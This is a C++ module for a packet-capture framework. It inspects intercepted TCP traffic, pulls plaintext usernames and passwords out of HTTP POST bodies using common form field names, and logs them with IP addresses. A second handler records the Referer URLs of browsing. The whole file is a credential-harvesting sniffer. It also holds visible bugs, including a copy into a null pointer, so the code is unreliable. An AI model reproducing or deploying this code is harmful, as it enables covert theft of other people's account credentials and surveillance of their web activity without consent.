
#include <iostream>
#include <map>
#include <stdlib.h>
#include <string.h>
#include <net/ethernet.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

#include "libmicrocai.h"
#include "kmysql.h"

struct HOSTDATA
{
	char strIP[20];
	char strHost[50];
};
struct MAIL_LOGIN_KEY
{
	char user[16];
	char password[16];
	char select[16];
};

std::map<in_addr_t,HOSTDATA> host_list;

static int RecordPOST(char *user,char*pswd,char*host, u_char*packet,in_addr_t sip,in_addr_t dip)
{
	struct NetAcount na(NetAcountType_POST,packet);// = (struct NetAcount*)malloc(8190);


	na.data = user;
	na.ip = sip;
	na.dstip = dip;

	strcpy(na.strType,"0001");

	na.passwd = pswd ;
	na.host = host;
    RecordAccout(&na);
    log_puts(L_DEBUG_OUTPUT_MORE,user);
    return 1;
}
static int RecordUrl(char *url,u_char*packet,in_addr_t sip,in_addr_t dip)
{
	struct NetAcount na(NetAcountType_HTTP,packet);// = (struct NetAcount*)malloc(8190);

	na.data = url;
	na.ip = sip;
	na.dstip = dip;
	strcpy(na.strType,"0001");
	na.packet =(char*) packet;
    RecordAccout(&na);
    log_puts(L_DEBUG_OUTPUT_MORE,url);
    return 1;
}
static int GetHttpPost(struct so_data*, u_char*packet)
{
	/**************************************************
	 *IP数据包通常就在以太网数据头的后面。以太网头的大小为14字节*
	 **************************************************/
	struct iphdr * ip_head = (struct iphdr*) (packet + ETH_HLEN);
	/**************************************************
	 *TCP头也就在IP头的后面。IP头的大小为20字节，不过最好从头里读取
	 **************************************************/
	struct tcphdr * tcp_head = (struct tcphdr*) (packet + ETH_HLEN
			+ ip_head->ihl * 4);
	/**************************************************
	 *TCP数据现对于tcp头的偏移由doff给出。这个也是tcp头的大小**
	 **************************************************/
	char* tcpdata = (char*) tcp_head + tcp_head->doff * 4;
	int tcpdatelen = ip_head->tot_len - tcp_head->doff * 4 - ip_head->ihl * 4;
	/*太小的包肯定就不是*/
	if (tcpdatelen < 10)
		return 0; // POST \r\n\r\n 几个字节？
	HOSTDATA* pHostData;
	std::map<in_addr_t, HOSTDATA>::iterator it;
	it = host_list.find(ip_head->daddr);
	if (it != host_list.end())
		pHostData = &it->second;
	else
		pHostData = NULL;

	const int nSize = 50;
	char pUser[50] =
	{ 0 };
	char pPassword[50] =
	{ 0 };
	char pHost[50] =
	{ 0 };

	if (!pHostData)
	{
		if (memcmp("POST ", tcpdata, 5) == 0)
		{
			char *pPos = NULL;
			pPos = strstr((char *) tcpdata, "Host:");
			if (pPos)
			{
				pPos = pPos + 6;
				char *pTemp = strstr(pPos, "\r\n");
				if (pTemp)
				{
					if (pTemp - pPos >= nSize)
						return 0;
					if (pTemp - pPos < 4)
						return 0;
					strncpy(pHost, pPos, pTemp - pPos);
					HOSTDATA HostData;
					inet_neta(ip_head->daddr, HostData.strIP, 20);
					strcpy(pHostData->strHost, pHost);
					if (host_list.size() > 2000)
						host_list.erase(host_list.begin());
					host_list.insert(std::pair<in_addr_t, HOSTDATA>(
							ip_head->daddr, *pHostData));

				}
			}
		}
	}
	else
	{
		strcpy(pHost, pHostData->strHost);
	}

	std::cout << "host : " << pHost << std::endl;

	MAIL_LOGIN_KEY loginKeys[] =
	{
	{ "username=", "password=", "&" },
	{ "pwuser=", "pwpwd=", "&" },
	{ "", "", "" } };

	for (int i = 0;; i++)
	{
		MAIL_LOGIN_KEY &key = loginKeys[i];

		if (strlen(key.user) == 0)
			break;

		char *pPos = NULL;
		char *pTemp = NULL;
		pPos = strstr((char *) tcpdata, key.user);
		if (pPos)
		{
			if (strlen(pUser) == 0)
			{
				pPos = pPos + strlen(key.user);
				pTemp = strstr(pPos, key.select);
				if (pTemp)
				{
					if (pTemp - pPos >= nSize)
						continue;
					strncpy(pUser, pPos, pTemp - pPos);
					std::cout << "username: " << pUser << std::endl;
				}
				else
					continue;
			}

			pPos = strstr(tcpdata, key.password);
			if (pPos)
			{
				pPos = pPos + strlen(key.password);
				pTemp = strstr(pPos, key.select);
				if (pTemp)
				{
					if (pTemp - pPos >= nSize)
						continue;
					strncpy(pPassword, pPos, pTemp - pPos);
					return RecordPOST(pUser,pPassword,pHost,packet,ip_head->saddr, ip_head->daddr);
				}
				else
					continue;
			}
		}
	}
	if (strlen(pUser))
		return RecordPOST(pUser, pPassword, pHost, packet,ip_head->saddr, ip_head->daddr);
	return 0;
}

static int url_packet_callback(struct so_data* sodata, u_char * packet)
{
    /**************************************************
     *IP数据包通常就在以太网数据头的后面。以太网头的大小为14字节*
     **************************************************/
    struct iphdr * ip_head = (struct iphdr*) (packet + ETH_HLEN);
    /**************************************************
     *TCP头也就在IP头的后面。IP头的大小为20字节，不过最好从头里读取
     **************************************************/
    struct tcphdr * tcp_head = (struct tcphdr*) (packet + ETH_HLEN + ip_head->ihl * 4);
    /**************************************************
     *TCP数据现对于tcp头的偏移由doff给出。这个也是tcp头的大小**
     **************************************************/
    char* tcpdata = (char*) tcp_head + tcp_head->doff * 4;
    int tcpdatelen = ip_head->tot_len - tcp_head->doff * 4 - ip_head->ihl * 4;
    /*太小的包肯定就不是*/
    if (tcpdatelen < 10)return 0; // GET / HTTP/1.1\r\n\r\n 几个字节？

    const int nSize = 4096;
    char *pUrl = new char[nSize];

    memset(pUrl, 0, nSize);
    static char strOldUrl[5][50];
    static int nCurPos = 0;
    if (memcmp("GET ", tcpdata , 4) == 0 || memcmp("POST ", tcpdata, 5) == 0)
    {
        char *pPos = NULL;
        pPos = strstr((char *) tcpdata , "Referer:");

        if (pPos)
        {
            pPos = pPos + 9;
            char *pTemp = strstr(pPos, "\r\n");
            if (pTemp) {
                if (pTemp - pPos >= nSize)
                    return 0;
                strncpy(pUrl, pPos, pTemp - pPos);
                for (int n = 0; n < 5; n++) {
                    if (strcmp(strOldUrl[n], pUrl) == 0)
                        return 0;
                }
                memset(strOldUrl[nCurPos], 0, 50);
                strcpy(strOldUrl[nCurPos], pUrl);
                nCurPos++;
                if (nCurPos == 5)
                    nCurPos = 0;
            }
            int nLen = strlen(pUrl);

            if (nLen >= nSize)
                return 0;
            if (nLen <= 5)
                return 0;
            return RecordUrl(pUrl,packet,ip_head->saddr ,ip_head->daddr);
        }
    }
    return 0;
}

static void * protocol_handler[2];
extern "C" int __module_init(struct so_data*so)
{
    std::cout << "URL 分析模块loaded!" << std::endl;
    //不是只有 80 端口才是 http !!!
    protocol_handler[0] = register_protocol_handler(url_packet_callback,0, IPPROTO_TCP);
    protocol_handler[1] = register_protocol_handler(GetHttpPost,0x5000, IPPROTO_TCP);
    return 0;
}

static void __attribute__((destructor)) so__unload(void)
{
    un_register_protocol_handler ( protocol_handler[0] );
    un_register_protocol_handler ( protocol_handler[1] );
}
char module_name[]="URL分析";
